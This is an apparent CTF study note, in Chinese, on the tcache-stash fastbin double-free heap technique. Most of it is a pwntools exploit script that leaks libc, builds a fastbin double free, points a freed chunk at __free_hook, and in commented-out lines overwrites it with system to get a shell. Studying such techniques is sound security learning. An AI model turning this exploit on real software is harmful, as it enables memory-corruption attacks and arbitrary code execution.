# tcache stash with fastbin double free

这个主要就是吧fastbin中的double free把他修改到tcahe中

![image-20250404233437720](./../images/image-20250404233437720.png)

但是要在fastbin中构造一个double free

![image-20250404233924239](./../images/image-20250404233924239.png)

这里主要的想法就是使用堆块把tcache填满使得数据写入到fastbin中从而在fastbin中构造一个double free

这里我们使用的代码就是通过for循环来使得

```python

    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


add_chunk(0, 0x410)
add_chunk(1, 0x10)
delete_chunk(0)
add_chunk(0, 0x410)
show_chunk(0)
libc.address = u64(p.recvuntil('\x7F')[-6:].ljust(8, '\x00')) - 0x3b6be0
info("libc base: " + hex(libc.address))

for i in range(9): add_chunk(i, 0x30)

for i in range(2, 9): delete_chunk(i)

delete_chunk(0)
delete_chunk(1)
delete_chunk(0)

for i in range(2, 9): add_chunk(i, 0x30)

add_chunk(0, 0x30)

edit_chunk(0, p64(libc.sym['__free_hook']))#通过这个方法就可以把tcache bin的fd改到free_hook中去

# add_chunk(0, 0x30)
# add_chunk(0, 0x30)
# add_chunk(0, 0x30)
#
# edit_chunk(0, p64(libc.sym['system']))#从这里就可以把freehook改为system使得我们可以执行权限
#
# edit_chunk(2,'/bin/sh\x00')
# delete_chunk(2)
gdb.attach(p)

p.interactive()

```

